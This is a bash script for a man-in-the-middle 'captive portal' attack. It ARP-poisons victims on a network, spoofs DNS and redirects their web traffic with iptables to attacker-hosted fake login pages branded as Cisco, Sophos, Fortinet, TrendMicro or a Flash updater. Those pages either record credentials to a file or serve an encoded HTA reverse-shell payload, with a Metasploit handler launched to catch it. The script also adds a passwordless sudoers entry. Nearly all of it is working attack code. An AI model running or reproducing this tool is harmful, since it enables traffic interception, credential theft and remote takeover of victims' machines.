#! /bin/bash
# Script version 1


#DEFINED COLOR SETTINGS
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)
mkdir -p ~/temp

InstallDeps()
{
# Installing dependencies
if ! dpkg -s conntrack > /dev/null; then
   echo -e "Installing conntrack"
   sudo apt-get -y --force-yes install conntrack
      if ! dpkg -s conntrack > /dev/null; then
        InstallDeps
      fi
fi
}

CreateFiles()
{
# Verify /var/lib/users Exists
#if [ ! -e "/var/lib/users" ]; then
   echo -e "User ID \t | Password \t | IP Address \t | MAC \t | Date" >/var/lib/users
#fi
chown www-data /var/lib/users

# Verify /usr/bin/rmtrack Exists
if [ ! -e "/usr/bin/rmtrack" ]; then
echo -e "/usr/sbin/conntrack -L \\" > /usr/bin/rmtrack
echo -e "    |grep \$1 \\" >> /usr/bin/rmtrack
echo -e "    |grep ESTAB \\" >> /usr/bin/rmtrack
echo -e "    |grep 'dport=80' \\" >> /usr/bin/rmtrack
echo -e "    |awk \\" >> /usr/bin/rmtrack
echo -e "        \"{ system(\\\"conntrack -D --orig-src \$1 --orig-dst \\\" \\" >> /usr/bin/rmtrack
echo -e "            substr(\\\$6,5) \\\" -p tcp --orig-port-src \\\" substr(\\\$7,7) \\\" \\" >> /usr/bin/rmtrack
echo -e "            --orig-port-dst 80\\\"); }\"" >> /usr/bin/rmtrack
fi
chmod +x /usr/bin/rmtrack

# Verify /etc/sudoers.d/mitm-captive Exists
if [ ! -e "/etc/sudoers.d/mitm-captive" ]; then
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -I internet 1 -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" > /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /sbin/iptables -D internet -t nat -m mac --mac-source ??\:??\:??\:??\:??\:?? -j RETURN" >> /etc/sudoers.d/mitm-captive
echo -e "www-data ALL = NOPASSWD: /usr/bin/rmtrack [0-9]*.[0-9]*.[0-9]*.[0-9]*" >> /etc/sudoers.d/mitm-captive
fi
}

CreateFirewallRules()
{
clear
echo
echo $BLUE"MITM Captive Portal script Version 1.0"
echo
echo $RED"************************************************";
echo $RED"Enter the Attacker Interface. Example eth0:";
read -e INTERFACE
xterm -bg blue -fg white -geometry 100x30+1000 -T "Network Config" -e "route -n && echo && ifconfig $INTERFACE && sleep 7m"&
echo $RED"Enter the Gateway IP address. Example 192.168.1.1:";
read -e GATEWAY
echo $RED"Enter the Attacker IP address. Example 192.168.1.100:";
read -e ATTACKER
xterm -bg blue -fg white -geometry 100x50+1000 -T "Passive ARP Discovery" -e "netdiscover -i $INTERFACE -p"&
echo $RED"Enter the Number of Victims to Poison:";
read -e VICTIMCOUNT
#echo $RED"************************************************";
#echo ""

IPTABLES=/sbin/iptables

#clear
#echo
#echo $BLUE"MITM Captive Portal script Version 1.0"
echo
echo $RED"************************************************";
echo $RED"Enter the Victim IP addresses, seperated by <ENTER>."; 
echo $RED"Example 192.168.1.2:";

VICTIM=()
VICTIMSHRT=()
   for ((i=1; i<=VICTIMCOUNT; i++));
   do
      read -e VICTIMTEMP
      $IPTABLES -A FORWARD -s $VICTIMTEMP -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
      VICTIM+=($VICTIMTEMP )
      if [ $i -gt 1 ]; then
         VICTIMSHRT+=$( echo " -t " && echo $VICTIMTEMP)
      fi
   done
   #Remove Spaces
#   VICTIMSHRTEMP=`echo ${VICTIMSHRT[*]} | sed 's/ //g'`
#   VICTIMSHORT=`echo ${VICTIMSHRT[*]} | sed 's/ //g'`
   #Remove first two chars
   #VICTIMSHORT=`echo $VICTIMSHRTEMP| awk '{print substr($0,3)}'`
   #Appends Victim1,Victim2,Victim3,...
   #Ettercap Format

if [ $VICTIMCOUNT -gt 1 ]; then
   TARGETS=${VICTIM[0]}${VICTIMSHRT[*]}
else
   TARGETS=$VICTIM
fi

#DEBUG
#echo "VICTIM=${VICTIM[@]}"
#echo $VICTIMSHRT
#echo $VICTIMSHRTEMP
#echo $VICTIMSHORT
echo $TARGETS

# FIREWALL SCRIPT
# /usr/local/sbin/iptables
# Create internet chain and add allow rules
# This is used to authenticate users who have already signed up
#$IPTABLES -A FORWARD -s $VICTIM -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -A INPUT -p udp -m udp --sport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -N internet -t nat
# First send all traffic via newly created internet chain
# At the prerouting NAT stage this will DNAT them to the local
# webserver for them to signup if they aren't authorized
# Packets for unauthorized users are marked for dropping later
$IPTABLES -t nat -A PREROUTING -j internet
###### INTERNET CHAIN ##########
# Allow authorized clients in, redirect all others to login webserver
# Add known users to the NAT table to stop their dest being rewritten
# Ignore MAC address with a * - these users are blocked
# This awk script goes through the /var/lib/users flat file line by line
#awk 'BEGIN { FS="t"; } { system("$IPTABLES -t nat -A internet -m mac --mac-source "$4" -j RETURN"); }' /var/lib/users
# MAC address not found. Mark the packet 99
$IPTABLES -t nat -A internet -j MARK --set-mark 99
# Redirects web requests from Unauthorized users to logon Web Page
$IPTABLES -t nat -A internet -m mark --mark 99 -p tcp --dport 80 -j DNAT --to-destination $ATTACKER
################################
# Now that we've got to the forward filter, drop all packets
# marked 99 - these are unknown users. We can't drop them earlier
# as there's no filter table
$IPTABLES -t filter -A FORWARD -m mark --mark 99 -j DROP
echo
echo "Firewall Config"
echo "----------------------------------------------"
iptables -L
echo
echo $GREEN"Press <ENTER> To Continue"
read -p ""
}

CreatePHP()
{
mkdir ~/temp/www
mv /var/www/* ~/temp/www/
clear


#######################################################
#Bypass menu to gotoHTA Attack - removed in version 2.0
attacktype=2
HTARS
#######################################################


#echo
#echo $BLUE"MITM Captive Portal script Version 1.0"
#echo
#echo $RED"************************************************";
#echo $RED"*    1.  Log In Credentials                    *";
#echo $RED"*    2.  HTA Reverse Shell                     *"; 
#echo $RED"*    3.  Terms of Service VBA Reverse Shell    *";
#echo $RED"************************************************";
#echo ""

#echo $BLUE"Select Menu Option:"
#read attacktype
#if [ $attacktype = "1" ]; then
#LogInCreds
#else
#if [ $attacktype = "2" ]; then
#HTARS
#else
#if [ $attacktype = "3" ]; then
#TOSVBA
#else
#CreatePHP
#fi
#fi
#fi
}

LogInCreds()
{
clear
echo
echo $BLUE"MITM Captive Portal script Version 1.0"
echo $BLUE"Log In Harvester"
echo
echo $RED"************************************************";
echo $RED"*    1.  Cisco                                 *";
echo $RED"*    2.  Microsoft Forefront                   *"; 
echo $RED"*    3.  Sophos                                *";
echo $RED"*    4.  SQUID                                 *";
echo $RED"*    5.  TrendMicro                            *";
echo $RED"*    6.  Fortigate\\Fortinet                    *";
echo $RED"************************************************";
echo ""

echo $BLUE"Select Menu Option:"
read menuoption
if [ $menuoption = "1" ]; then
tar -xf ~/temp/ploys/Creds/cisco.tar -C /var/www
service apache2 start
else
if [ $menuoption = "2" ]; then
tar -xf ~/temp/ploys/Creds/MSForefront.tar -C /var/www
service apache2 start
else
if [ $menuoption = "3" ]; then
tar -xf ~/temp/ploys/Creds/Sophos.tar -C /var/www
service apache2 start
else
if [ $menuoption = "4" ]; then
tar -xf ~/temp/ploys/Creds/squid.tar -C /var/www
service apache2 start
else
if [ $menuoption = "5" ]; then
tar -xf ~/temp/ploys/Creds/trendmicro.tar -C /var/www
service apache2 start
else
if [ $menuoption = "6" ]; then
tar -xf ~/temp/ploys/Creds/Fortinet.tar -C /var/www
service apache2 start
else
LogInCreds
fi
fi
fi
fi
fi
fi
}

HTARS()
{
clear
echo 
echo $BLUE"MITM Captive Portal script Version 1.0"
echo $BLUE"HTA Reverse Shell"
echo
echo $RED"************************************************";
echo $RED"*    1.  Cisco                                 *";
echo $RED"*    2.  Microsoft Forefront                   *"; 
echo $RED"*    3.  Sophos                                *";
echo $RED"*    4.  SQUID                                 *";
echo $RED"*    5.  TrendMicro                            *";
echo $RED"*    6.  Fortigate\\Fortinet                    *";
echo $RED"*    7.  Flash Updater                         *";
echo $RED"*    8.  Forttinet - Old Style                 *";
echo $RED"*    9.  Custom                                *";
echo $RED"************************************************";
echo ""

echo $BLUE"Select Menu Option:"
read menuoption
if [ $menuoption = "1" ]; then
tar -xf ~/temp/ploys/HTA/cisco.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "2" ]; then
tar -xf ~/temp/ploys/HTA/MSForefront.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else 
if [ $menuoption = "3" ]; then
tar -xf ~/temp/ploys/HTA/Sophos.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "4" ]; then
tar -xf ~/temp/ploys/HTA/squid.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "5" ]; then
tar -xf ~/temp/ploys/HTA/trendmicro.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "6" ]; then
tar -xf ~/temp/ploys/HTA/Fortinet.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "7" ]; then
tar -xf ~/temp/ploys/HTA/flash.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
#sed -n "/<script/,/<\/script>/p" /var/www/exploit.hta > /var/www/reverse_code.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/install_flash_player.hta
else
if [ $menuoption = "8" ]; then
tar -xf ~/temp/ploys/HTA/Fortinet-Old-Style.tar -C /var/www
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
if [ $menuoption = "9" ]; then
echo "Move the web files over to /var/www/ then press <ENTER>"
read -p ""
service apache2 start
ruby /toolslinux/exploits/ps1encode/ps1encodeV2.rb -i $ATTACKER > /var/www/exploit.hta
sed -i "s/powershell/$(cat /var/www/exploit.hta)/g" /var/www/verify.hta
else
HTARS
fi
fi
fi
fi
fi
fi
fi
fi
fi
}


TOSVBA()
{
echo TOSVBA
}


ConfigWeb()
{
clear
if [ $menuoption = "7" ]; then
SERVERNAME=get
DOMAINNAME=adobe.com
SITENAME=Flash 
else
echo
echo $BLUE"MITM Captive Portal script Version 1.0"
echo
echo $RED"************************************************";
echo $RED"Enter the Desired Server Name, Example: PROXY";
read -e SERVERNAME
echo $RED"Enter the Domain Name, Example: DOMAIN.COM";
read -e DOMAINNAME
echo $RED"Enter the Site Name, Example: Company Web Access Portal";
read -e SITENAME
echo $RED"************************************************";
echo ""

sed -i s/SERVER_NAME_REPLACE/$SERVERNAME/ /var/www/index.php
sed -i s/DOMAIN_NAME_REPLACE/$DOMAINNAME/ /var/www/index.php
sed -i s/SITE_NAME_REPLACE/"$SITENAME"/ /var/www/index.php
fi
}

ConfigEtter()
{
echo 1 > /proc/sys/net/ipv4/ip_forward

mv /etc/ettercap/etter.dns ~/temp/etter.dns
echo "*.$SERVERNAME.$DOMAINNAME    A   $ATTACKER" > /etc/ettercap/etter.dns
echo "*.$SERVERNAME.$DOMAINNAME.*    A   $ATTACKER" >> /etc/ettercap/etter.dns
echo "$SERVERNAME.$DOMAINNAME  PTR $ATTACKER" >> /etc/ettercap/etter.dns

echo "$ATTACKER $SERVERNAME.$DOMAINNAME" > /var/www/hosts.txt
}

Attack()
{
echo 1 > /proc/sys/net/ipv4/ip_forward
if [ $attacktype -gt 1 ]; then
    xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r /toolslinux/epa/handler/local/handler.rc"&
    echo
    echo $GREEN"Press <ENTER> After Meterpreter Loads"
    read -p ""
fi
if [ $menuoption -ne 7 ]; then
#if [ $attacktype -eq 1 ]; then
    xterm -bg blue -fg white -geometry 100x20+1000 -T "User Creds File - /var/lib/users" -e "tail -f /var/lib/users"&
fi

#sleep 5
#xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -T -Q -i $INTERFACE -M ARP:remote -P dns_spoof /$TARGETS/ /$GATEWAY/"
xterm -bg blue -fg white -geometry 100x50+300+500 -T "DNS Spoof for $SERVERNAME.$DOMAINNAME" -e "dnsspoof -i $INTERFACE -f /var/www/hosts.txt"&
echo $INTERFACE $TARGETS $GATEWAY
#xterm -bg blue -fg white -geometry 100x70+0 -T "ETTERCAP ARP Poison" -e "ettercap -T -Q -i $INTERFACE -M ARP:remote /$TARGETS/ /$GATEWAY/"
xterm -bg blue -fg white -geometry 100x70+0 -T "arpspoof ARP Poison" -e "arpspoof -i $INTERFACE -t $TARGETS -r $GATEWAY"
#sleep 30
echo ""
}




RevertFirewall()
{
echo ----------------------------------------------
echo "Stopping firewall and allowing everyone..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
echo 0 > /proc/sys/net/ipv4/ip_forward
clear
}




#Begining

COUNT=1
InstallDeps
CreateFiles
RevertFirewall
#NetworkConfig
CreateFirewallRules
CreatePHP
ConfigWeb
ConfigEtter
Attack

mv ~/temp/etter.dns /etc/ettercap/etter.dns
rm -R /var/www/*
mv ~/temp/www/* /var/www/
service apache2 stop

clear
echo 
echo $BLUE"MITM Captive Portal script Version 1.0"
echo 
echo $RED"************************************************";
echo $RED"Do You Want to Revert Your Firewall Back to Allow All? (y/n)";
read -e REVERT
if [ "$REVERT" == "y" -o "$REPLY" == "Y" ]; then
   RevertFirewall
fi
cp /var/lib/users ~/$fdate.captured-credentials.txt
echo "Credentials Stored in: ~/$fdate.captured-credentials.txt"
